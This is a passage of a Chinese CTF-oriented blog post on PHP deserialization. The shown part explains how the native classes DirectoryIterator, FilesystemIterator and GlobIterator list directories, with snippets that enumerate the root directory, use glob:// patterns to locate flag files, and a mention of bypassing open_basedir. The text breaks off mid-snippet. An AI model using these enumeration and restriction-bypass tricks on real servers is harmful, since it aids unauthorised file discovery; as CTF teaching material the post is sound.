<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="在NSS平台上面做题时遇到序列化与反序列化之原生类和字符逃逸的一题经典题目；可以采用者两种解法去解题；所以写下一篇关于序列化与反序列化之原生类和字符逃逸的学习">
<meta property="og:type" content="article">
<meta property="og:title" content="序列化与反序列化之原生类和字符逃逸">
<meta property="og:url" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="在NSS平台上面做题时遇到序列化与反序列化之原生类和字符逃逸的一题经典题目；可以采用者两种解法去解题；所以写下一篇关于序列化与反序列化之原生类和字符逃逸的学习">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/24.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/25.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/26.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/29.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/28.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/27.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/30.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/31.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/32.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/33.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/35.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/34.png">
<meta property="article:published_time" content="2023-04-20T02:57:41.000Z">
<meta property="article:modified_time" content="2023-04-25T12:47:52.792Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/9.png"><title>序列化与反序列化之原生类和字符逃逸 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">序列化与反序列化之原生类和字符逃逸</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-04-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h2 id="一、PHP原生类之文件操作">
          <a href="#一、PHP原生类之文件操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、PHP原生类之文件操作" class="headerlink" title="一、PHP原生类之文件操作"></a>一、PHP原生类之文件操作</h2>
      
        <h2 id="1-遍历文件目录类">
          <a href="#1-遍历文件目录类" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-遍历文件目录类" class="headerlink" title="1.遍历文件目录类"></a>1.遍历文件目录类</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这三个类都可以遍历文件目录</span><br><span class="line">DirectoryIterator </span><br><span class="line">FilesystemIterator </span><br><span class="line">GlobIterator </span><br></pre></td></tr></table></div></figure>

        <h2 id="1-DirectoryIterator类：这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的toString-方法，输出指定目录里面经过排序之后的第一个文件名。测似代码-2-FilesystemIterator类-FilesystemIterator类与DirectoryIterator类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器-该类的使用方法与DirectoryIterator类也是基本相同的-但是这个类的toString会以绝对路径显示文件名测试代码-3-GlobIterator类与前两个类的作用相似-GlobIterator类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于-glob-可以通过模式匹配来寻找文件路径。其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的toString-方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而-GlobIterator-类便可以帮我们在一定程度上解决了这个问题。由于-GlobIterator-类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似-GlobIterator-x2F-flag-：测试代码2-使用可遍历目录类绕过-open-basedir">
          <a href="#1-DirectoryIterator类：这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的toString-方法，输出指定目录里面经过排序之后的第一个文件名。测似代码-2-FilesystemIterator类-FilesystemIterator类与DirectoryIterator类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器-该类的使用方法与DirectoryIterator类也是基本相同的-但是这个类的toString会以绝对路径显示文件名测试代码-3-GlobIterator类与前两个类的作用相似-GlobIterator类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于-glob-可以通过模式匹配来寻找文件路径。其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的toString-方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而-GlobIterator-类便可以帮我们在一定程度上解决了这个问题。由于-GlobIterator-类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似-GlobIterator-x2F-flag-：测试代码2-使用可遍历目录类绕过-open-basedir" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-DirectoryIterator类：这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的toString-方法，输出指定目录里面经过排序之后的第一个文件名。测似代码-2-FilesystemIterator类-FilesystemIterator类与DirectoryIterator类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器-该类的使用方法与DirectoryIterator类也是基本相同的-但是这个类的toString会以绝对路径显示文件名测试代码-3-GlobIterator类与前两个类的作用相似-GlobIterator类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于-glob-可以通过模式匹配来寻找文件路径。其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的toString-方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而-GlobIterator-类便可以帮我们在一定程度上解决了这个问题。由于-GlobIterator-类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似-GlobIterator-x2F-flag-：测试代码2-使用可遍历目录类绕过-open-basedir" class="headerlink" title="(1)DirectoryIterator类：这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的toString()方法，输出指定目录里面经过排序之后的第一个文件名。测似代码:(2)FilesystemIterator类:FilesystemIterator类与DirectoryIterator类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器.该类的使用方法与DirectoryIterator类也是基本相同的;但是这个类的toString会以绝对路径显示文件名测试代码(3)GlobIterator类与前两个类的作用相似,GlobIterator类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob(),可以通过模式匹配来寻找文件路径。其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的toString()方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(&#x2F;flag)：测试代码2.使用可遍历目录类绕过 open_basedir"></a>(1)DirectoryIterator类：<br>这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的toString()方法，输出指定目录里面经过排序之后的第一个文件名。<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;版本:PHP 5, PHP 7, PHP 8</span><br><span class="line">&lt;2&gt;用法:$dir = new DirectoryIterator(dirname(__FILE__));</span><br><span class="line">得到的这个$dir对象，就是__FILE__所在目录下的所有文件和子文件夹的一个综合体，每一个项目对应对象的一个属性</span><br></pre></td></tr></table></div></figure><br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/9.png"><br>测似代码:<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果想输出全部的文件名我们还需要对$dir对象进行遍历:</span><br><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">foreach($dir as $f)&#123;</span><br><span class="line">    echo($f.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</span><br><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;glob:///*php*&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><br>(2)FilesystemIterator类:<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;版本:PHP 5 &gt;= 5.1.0, PHP 7, PHP 8</span><br><span class="line">&lt;2&gt;用法:$context = new SplFileObject(&#x27;文件路径&#x27;);</span><br></pre></td></tr></table></div></figure><br>FilesystemIterator类与DirectoryIterator类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器.该类的使用方法与DirectoryIterator类也是基本相同的;但是这个类的toString会以绝对路径显示文件名<br><img src="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/10.png"><br>测试代码<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new FilesystemIterator(&quot;/&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果想输出全部的文件名我们还需要对$dir对象进行遍历:</span><br><span class="line">&lt;?php</span><br><span class="line">$dir=new FilesystemIterator(&quot;/&quot;);</span><br><span class="line">foreach($dir as $f)&#123;</span><br><span class="line">    echo($f.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：</span><br><span class="line">&lt;?php</span><br><span class="line">$dir=new 